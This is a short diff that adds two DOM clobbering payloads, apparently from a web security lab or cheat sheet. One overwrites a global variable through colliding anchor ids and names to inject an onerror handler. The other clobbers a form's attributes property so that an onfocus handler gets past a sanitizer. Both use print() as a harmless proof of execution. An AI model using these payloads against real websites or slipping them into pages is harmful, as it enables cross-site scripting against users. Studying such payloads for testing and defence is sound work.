@@ -1,0 +1,8 @@
+# Overwrite globals via ID/name collisions
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=print()//">
+
+# Clobber form attributes to keep event handlers
+<form id=x tabindex=0 onfocus=print()>
+  <input id=attributes>
+</form>
+
